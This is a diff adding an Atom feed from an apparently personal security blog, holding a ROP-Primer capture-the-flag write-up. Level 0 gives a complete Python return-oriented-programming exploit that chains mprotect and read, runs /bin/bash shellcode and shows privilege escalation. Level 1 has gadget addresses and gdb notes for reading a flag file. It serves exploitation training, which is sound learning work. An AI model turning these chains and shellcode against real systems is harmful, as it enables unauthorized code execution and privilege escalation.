@@ -1,0 +1,99 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Rop | tick.Tack]]></title>
+  <link href="http://newdominic.github.io/blog/categories/rop/atom.xml" rel="self"/>
+  <link href="http://newdominic.github.io/"/>
+  <updated>2016-06-17T21:51:18+08:00</updated>
+  <id>http://newdominic.github.io/</id>
+  <author>
+    <name><![CDATA[DMC]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[ROP-Primer Level 0]]></title>
+    <link href="http://newdominic.github.io/blog/2015/04/16/rop-primer/"/>
+    <updated>2015-04-16T01:12:03+08:00</updated>
+    <id>http://newdominic.github.io/blog/2015/04/16/rop-primer</id>
+    <content type="html"><![CDATA[<p>ROP-Primer</p>
+
+<!--more-->
+
+
+<hr />
+
+<p><strong><em>Level 0</em></strong></p>
+
+<pre><code><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>
+
+<span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&amp;lt;L&#39;</span><span class="p">,</span><span class="n">x</span><span class="p">)</span>
+
+<span class="n">payload</span><span class="o">=</span><span class="s">&quot;&quot;</span>
+<span class="n">payload</span><span class="o">+=</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">44</span>
+
+<span class="n">payload</span><span class="o">+=</span><span class="n">p</span><span class="p">(</span><span class="mh">0x080523e0</span><span class="p">)</span>  <span class="c">#mprotect@plt</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p</span><span class="p">(</span><span class="mh">0x08048882</span><span class="p">)</span>  <span class="c">#pppr</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p</span><span class="p">(</span><span class="mh">0xbfff5000</span><span class="p">)</span>  <span class="c">#addr</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>      <span class="c">#page-aligned size</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>         <span class="c">#PROT_READ|PROT_WRITE|PROT_EXEC</span>
+
+<span class="n">payload</span><span class="o">+=</span><span class="n">p</span><span class="p">(</span><span class="mh">0x80517f0</span><span class="p">)</span>   <span class="c">#read@plt</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p</span><span class="p">(</span><span class="mh">0x08048882</span><span class="p">)</span>  <span class="c">#pppr</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>         <span class="c">#fd=SDIN</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p</span><span class="p">(</span><span class="mh">0xbfff5000</span><span class="p">)</span>  <span class="c">#addr</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>       <span class="c">#length</span>
+
+<span class="n">payload</span><span class="o">+=</span><span class="n">p</span><span class="p">(</span><span class="mh">0xbfff5000</span><span class="p">)</span>  <span class="c">#address of shellcode</span>
+
+<span class="k">print</span> <span class="n">payload</span></code></pre></div>
+
+
+
+level0@rop:~$ (./gen.py ;python -c &#8216;print &#8220;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&#8221;&#8217;; cat) | ./level0
+[+] ROP tutorial level0
+[+] What&#8217;s your name? [+] Bet you can&#8217;t ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAà‚!
+id
+uid=1000(level0) gid=1000(level0) euid=1001(level1) groups=1001(level1),1000(level0)
+</code></pre>
+
+<hr />
+
+<p><strong><em>Level 1</em></strong></p>
+
+<p>Line 71,72
+filesize &lt; sizeof (filename)</p>
+
+<p>gdb-peda$ ropgadget
+ret = 0x804851c
+popret = 0x8048e93
+pop2ret = 0x8048ef7
+pop3ret = 0x8048ef6
+pop4ret = 0x8048ef5
+leaveret = 0x8048610
+addesp_44 = 0x8048ef2</p>
+
+<p>0x8049128 &ldquo;flag&rdquo;</p>
+
+<p>0xf7f27620 <open>
+0xf7f27aa0 <read>
+0xf7f27b20 <write></p>
+
+<p>fd[eax]=open(&ldquo;flag&rdquo;,?,?)
+read(fd,buf_addr,size)
+write(stdout[1], buf_addr, size)</p>
+
+<p>b <em>0x08048d8c
+set </em>0xbffff6c0=0x22ba
+set follow-fork-mode child
+b <em>0x8048a34 (store)
+b </em>0x08048c5b (read)</p>
+]]></content>
+  </entry>
+  
+</feed>
